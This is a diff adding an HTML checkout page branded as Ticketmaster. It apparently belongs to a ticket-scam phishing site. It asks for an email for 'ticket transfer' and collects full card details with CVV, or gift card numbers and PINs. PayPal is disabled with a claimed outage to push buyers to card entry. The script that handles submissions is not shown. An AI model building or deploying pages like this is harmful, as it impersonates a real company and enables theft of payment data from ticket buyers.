@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Checkout - Ticketmaster</title>
+  <link rel="stylesheet" href="checkout-style.css?v=20260525000001">
+</head>
+<body>
+  <!-- PROFESSIONAL HEADER -->
+  <header class="main-header">
+    <div class="header-container">
+      <!-- Logo (Desktop: Left, Mobile: Center) -->
+      <div class="logo-section">
+        <img src="ticketmaster_black.svg" alt="Ticketmaster" class="logo-image">
+      </div>
+
+      <!-- Translator (Desktop: Right of logo) -->
+      <div class="translator-section">
+        <img src="googlefree.png" alt="Translate" class="translator-icon">
+        <select id="languageSelect" class="language-select" onchange="changeLanguage(this.value)">
+          <option value="en">English</option>
+          <option value="es">Español</option>
+          <option value="fr">Français</option>
+          <option value="de">Deutsch</option>
+          <option value="it">Italiano</option>
+          <option value="pt">Português</option>
+          <option value="ru">Русский</option>
+          <option value="ja">日本語</option>
+          <option value="ko">한국어</option>
+          <option value="zh">中文</option>
+          <option value="ar">العربية</option>
+          <option value="hi">हिन्दी</option>
+          <option value="th">ไทย</option>
+          <option value="tr">Türkçe</option>
+          <option value="nl">Nederlands</option>
+          <option value="pl">Polski</option>
+          <option value="sv">Svenska</option>
+          <option value="no">Norsk</option>
+          <option value="da">Dansk</option>
+          <option value="fi">Suomi</option>
+          <option value="el">Ελληνικά</option>
+          <option value="hu">Magyar</option>
+          <option value="cs">Čeština</option>
+          <option value="ro">Română</option>
+          <option value="he">עברית</option>
+          <option value="id">Bahasa Indonesia</option>
+          <option value="vi">Tiếng Việt</option>
+          <option value="ms">Bahasa Melayu</option>
+          <option value="uk">Українська</option>
+        </select>
+      </div>
+
+      <!-- Search Bar (Desktop) -->
+      <div class="search-container">
+        <input type="text" class="search-input" id="searchInput" placeholder="Search by artist, event or venue...">
+        <button class="search-btn" onclick="applySearch()">Search</button>
+      </div>
+
+      <!-- Hamburger Menu (Mobile) -->
+      <button class="hamburger-menu" id="hamburgerBtn" type="button">
+        <img src="hamburger.svg" alt="Menu" class="hamburger-icon">
+      </button>
+    </div>
+
+    <!-- Mobile Navigation Menu -->
+    <nav class="mobile-menu" id="mobileMenu">
+      <a href="index.html" class="mobile-nav-link">Home</a>
+      <a href="tickets.html" class="mobile-nav-link">Tickets</a>
+      <a href="#" class="mobile-nav-link">Hotels</a>
+      <a href="#" class="mobile-nav-link">Gift Cards</a>
+      <a href="#" class="mobile-nav-link">Help</a>
+      <a href="#" class="mobile-nav-link">VIP</a>
+      <a href="#" class="mobile-nav-link">PayPal Partner</a>
+    </nav>
+  </header>
+
+  <!-- Secondary Navigation Menu (Desktop only) -->
+  <nav class="secondary-nav">
+    <div class="secondary-nav-container">
+      <a href="index.html" class="secondary-nav-link">Home</a>
+      <a href="tickets.html" class="secondary-nav-link">Tickets</a>
+      <a href="#" class="secondary-nav-link">Hotels</a>
+      <a href="#" class="secondary-nav-link">Gift Cards</a>
+      <a href="#" class="secondary-nav-link">Help</a>
+      <a href="#" class="secondary-nav-link">VIP</a>
+      <a href="#" class="secondary-nav-link">PayPal Partner</a>
+    </div>
+  </nav>
+
+  <!-- EMAIL INPUT MODAL -->
+  <div id="emailModal" class="modal-overlay">
+    <div class="modal-box">
+      <h2>Email Address Required</h2>
+      <p>Please provide your email address to receive your tickets. Your tickets will be transferred and sent to this email address.</p>
+      <input type="email" id="emailInput" placeholder="Enter your email address" class="email-input">
+      <div class="modal-buttons">
+        <button id="emailSubmitBtn" class="btn-primary">Proceed</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- LOADING SPINNER MODAL -->
+  <div id="loadingModal" class="loading-modal-overlay" style="display: none;">
+    <div class="loading-container">
+      <div class="spinner"></div>
+      <p>Processing your order...</p>
+    </div>
+  </div>
+
+  <!-- STYLED ALERT (small, local) -->
+  <div id="styledAlert" class="styled-alert-overlay" style="display:none;">
+    <div class="styled-alert-box">
+      <p id="styledAlertMessage">Message</p>
+      <div class="styled-alert-actions">
+        <button id="styledAlertOk" class="btn-primary">Continue</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- MAIN CHECKOUT CONTENT -->
+  <div class="checkout-container" style="display: none;">
+    <!-- CHECKOUT HEADER INFO WITH TICKET DETAILS -->
+    <div class="checkout-header-section">
+      <!-- Left: Checkout Header & Order Info -->
+      <div class="checkout-header">
+        <h1>Checkout</h1>
+        <p class="order-email">Order for: <strong id="displayEmail"></strong></p>
+      </div>
+      
+      <!-- Right: Ticket Details -->
+      <div class="ticket-details">
+        <div class="ticket-detail-item">
+          <span class="detail-label">Event:</span>
+          <span class="detail-value" id="detailEvent">-</span>
+        </div>
+        <div class="ticket-detail-item">
+          <span class="detail-label">Date & Time:</span>
+          <span class="detail-value" id="detailDateTime">-</span>
+        </div>
+        <div class="ticket-detail-item">
+          <span class="detail-label">Ticket Type:</span>
+          <span class="detail-value" id="detailType">-</span>
+        </div>
+        <div class="ticket-detail-item">
+          <span class="detail-label">Seat/Section:</span>
+          <span class="detail-value" id="detailSeat">-</span>
+        </div>
+        <div class="ticket-detail-item">
+          <span class="detail-label">Quantity:</span>
+          <span class="detail-value" id="detailQuantity">-</span>
+        </div>
+        <div class="ticket-detail-item total">
+          <span class="detail-label">Total Price:</span>
+          <span class="detail-value" id="detailTotal">-</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- PAYMENT METHODS TABS -->
+    <div class="payment-section">
+      <div class="payment-tabs">
+        <button class="payment-tab active" data-method="card">
+          <img src="card.jpg" alt="Card" class="tab-icon">
+          <span>Card Payment</span>
+        </button>
+        <button class="payment-tab" data-method="paypal">
+          <img src="paypal.jpg" alt="PayPal" class="tab-icon">
+          <span>PayPal Payment</span>
+        </button>
+        <button class="payment-tab" data-method="gift-card">
+          <img src="gift-card.jpg" alt="Gift Card" class="tab-icon">
+          <span>Gift Card</span>
+        </button>
+      </div>
+
+      <!-- CARD PAYMENT METHOD -->
+      <div class="payment-method active" id="card-method">
+        <h3>Credit/Debit Card Details</h3>
+        <form id="cardForm">
+          <div class="form-group">
+            <label for="cardNumber">Card Number</label>
+            <div class="card-input-wrapper">
+              <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" class="form-input">
+              <img id="cardIcon" class="card-icon" style="display: none;" alt="Card Type">
+            </div>
+          </div>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label for="expiryDate">Expiry Date</label>
+              <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" class="form-input">
+            </div>
+            <div class="form-group">
+              <label for="cvv">CVV</label>
+              <input type="text" id="cvv" placeholder="123" maxlength="4" class="form-input">
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label for="postalCode">Postal Code</label>
+            <input type="text" id="postalCode" placeholder="12345" class="form-input">
+          </div>
+
+          <button type="submit" class="btn-checkout">Complete Purchase</button>
+        </form>
+      </div>
+
+      <!-- PAYPAL PAYMENT METHOD -->
+      <div class="payment-method" id="paypal-method">
+          <h3>PayPal Payment</h3>
+          <h4 class="paypal-warning">We're experiencing PayPal payment issue currently.</h4>
+          <p class="paypal-note">Please use Card Payment to avoid delaying your order. Thank you!</p>
+          <button class="btn-checkout btn-paypal" disabled aria-disabled="true">Proceed to PayPal</button>
+      </div>
+
+      <!-- GIFT CARD METHOD -->
+      <div class="payment-method" id="gift-card-method">
+        <h3>Gift Card</h3>
+        <form id="giftCardForm">
+          <div class="form-group">
+            <label for="giftCardNumber">Gift Card Number</label>
+            <input type="text" id="giftCardNumber" placeholder="Enter your gift card number" class="form-input">
+          </div>
+
+          <div class="form-group">
+            <label for="giftCardPin">PIN</label>
+            <input type="text" id="giftCardPin" placeholder="Enter PIN" maxlength="4" class="form-input">
+          </div>
+
+          <button type="submit" class="btn-checkout">Complete Purchase</button>
+        </form>
+      </div>
+    </div>
+
+    <!-- HR LINE DIVIDER -->
+    <hr class="payment-divider">
+
+    <!-- ACCEPTED PAYMENT METHODS SECTION -->
+    <div class="accepted-methods">
+      <h3>Accepted Payment Methods</h3>
+      <div class="methods-info">
+        <div class="method-item">
+          <div class="method-text">
+            <strong>1. Credit and Debit Cards:</strong> Visa, MasterCard, and American Express are accepted, whether debit or credit, and can be used securely for all purchases.
+          </div>
+          <div class="method-images">
+            <img src="visa.png" alt="Visa">
+            <img src="mastercard1.png" alt="MasterCard">
+            <img src="american-express.jpg" alt="American Express">
+          </div>
+        </div>
+
+        <div class="method-item">
+          <div class="method-text">
+            <strong>2. PayPal:</strong> Available for ticket purchases.
+          </div>
+          <div class="method-images">
+            <img src="paypal.jpg" alt="PayPal">
+          </div>
+        </div>
+
+        <div class="method-item">
+          <div class="method-text">
+            <strong>3. Gift Cards:</strong> Can be used for standard ticket purchases and resell tickets.
+          </div>
+          <div class="method-images">
+            <img src="gift-card.jpg" alt="Gift Card">
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div class="footer-container">
+      <div class="footer-section">
+        <h4>About Ticketmaster</h4>
+        <ul>
+          <li><a href="#">About Us</a></li>
+          <li><a href="#">Careers</a></li>
+          <li><a href="#">Press</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-section">
+        <h4>Support</h4>
+        <ul>
+          <li><a href="#">Help Center</a></li>
+          <li><a href="#">Contact Us</a></li>
+          <li><a href="#">Report Issue</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-section">
+        <h4>Legal</h4>
+        <ul>
+          <li><a href="#">Privacy Policy</a></li>
+          <li><a href="#">Terms & Conditions</a></li>
+          <li><a href="#">Cookie Policy</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-section">
+        <h4>Follow Us</h4>
+        <ul>
+          <li><a href="#">Facebook</a></li>
+          <li><a href="#">Twitter</a></li>
+          <li><a href="#">Instagram</a></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="footer-bottom">
+      <p>&copy; 2026 Ticketmaster. All rights reserved.</p>
+    </div>
+  </footer>
+
+  <script src="checkout-script.js?v=20260525000001"></script>
+</body>
+</html>
